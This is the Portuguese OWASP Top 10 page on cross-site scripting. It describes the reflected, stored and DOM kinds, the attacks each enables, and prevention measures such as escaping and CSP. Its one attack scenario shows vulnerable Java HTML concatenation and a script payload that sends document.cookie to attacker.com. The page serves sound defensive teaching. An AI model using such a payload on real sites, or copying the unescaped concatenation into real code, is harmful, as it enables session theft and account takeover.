---
title: A7 Cross-site scripting (XSS)
---

## A Aplicação é Vulnerável?
Existem três tipos de XSS que visam normalmente o navegador dos utilizadores:

* __Reflected XSS__: A aplicação ou API incluem dados de entrada do utilizador como parte do HTML da resposta sem que estes tenham sido validados e/ou os caracteres especiais tratados (escaping). Um ataque bem sucedido pode permitir a execução de código HTML e JavaScript no navegador da vítima. Normalmente a vítima segue um endereço malicioso para uma página controlada pelo atacante tal como watering hole websites, publicidade ou algo semelhante.
* __Stored XSS__: A aplicação ou API armazenam dados de entrada do utilizador de forma não tratada (sanitization) os quais serão mais tarde acedidos por outro utilizador ou administrador. Este tipo de XSS é considerado de risco alto ou crítico.
* __DOM XSS__: Tipicamente as frameworks JavaScript, Single Page Applications (SPA) e APIs que incluem na página, de forma dinâmica, informação controlada pelo atacante, são vulneráveis a DOM XSS. Idealmente a aplicação não enviaria informação controlada pelo atacante para as APIs JavaScript. 

>Os ataques típicos de XSS visam o roubo da sessão do utilizador, roubo ou controlo da conta de utilizador, contornar autenticação de multi-fator (MFA), alteração do DOM por substituição ou alteração de nós (e.g. formulários), ataques contra o navegador do utilizador tais como o download de software malicioso, key logging entre outros

## Exemplos de Cenários de Ataque

#### Cenário #1: 
A aplicação usa informação não confiável na construção do HTML abaixo, sem validação ou escaping:

```html
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>"; 
<!--O atacante pode alterar o valor de CC para:-->
'><script>document.location=  'http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'.
```
Isto irá fazer com que a sessão da vítima seja enviada para a página do atacante, dando-lhe o controlo sobre a atual sessão
do utilizador. 

>Nota: Os atacantes podem tirar partido do XSS para derrotar qualquer mecanismo de defesa automática contra Cross-Site Request Forgery (CSRF).

## Como Prevenir
Prevenir ataques de XSS requer a separação dos dados não confiáveis do conteúdo ativo do navegador. 
Isto é conseguido através dos itens listados abaixo:

* Utilização de frameworks que ofereçam nativamente protecção para XSS tais como as versões mais recentes de Ruby on Rails e ReactJS. É preciso conhecer as limitações destes mecanismos de proteção por forma a tratar de forma adequada os casos não cobertos.
* Tratamento adequado (escaping) da informação não confiável no pedido HTTP, tendo em conta o contexto onde esta informação irá ser inserida no HTML (body, atributo, JavaScript, CSS ou URL), resolve os tipos Reflected e Stored XSS. Detalhes sobre como tratar esta informação estão no OWASP Cheat Sheet 'XSS Prevention'.
* Aplicação de codificação de caracteres adequada ao contexto de utilização aquando da modificação da página no lado do cliente previne DOM XSS. Quando isto não é possível, podem utilizar-se algumas das técnicas referidas no documento OWASP Cheat Sheet 'DOM based XSS Prevention'.
* Adição de Content Security Policy (CSP) enquanto medida de mitigação de XSS. É uma medida eficaz se não existirem outras vulnerabilidades que possibilitem a inclusão de código malicioso através de ficheiros locais da aplicação (e.g. path traversal overwrites ou dependências vulneráveis incluídas a partir de CDNs autorizadas).